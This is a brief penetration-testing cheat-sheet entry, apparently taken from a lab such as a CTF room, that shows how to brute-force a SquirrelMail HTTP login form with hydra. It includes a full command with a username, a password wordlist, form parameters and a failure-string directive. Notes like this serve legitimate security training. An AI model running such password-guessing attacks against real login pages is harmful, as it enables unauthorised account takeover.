---
title: Hydra - HTTP Form POST Bruteforce
category: initial-access
subcategory: bruteforce
os: linux
command: hydra http-form-post target
tools: hydra
---


Inspect the login request in the browser Network tab to identify the parameter format. The `:F=` directive specifies the failure indicator string.

### Example

```bash
hydra -l milesdyson -P log1.txt 10.10.238.31 -V http-form-post '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown User or password incorrect.'
```
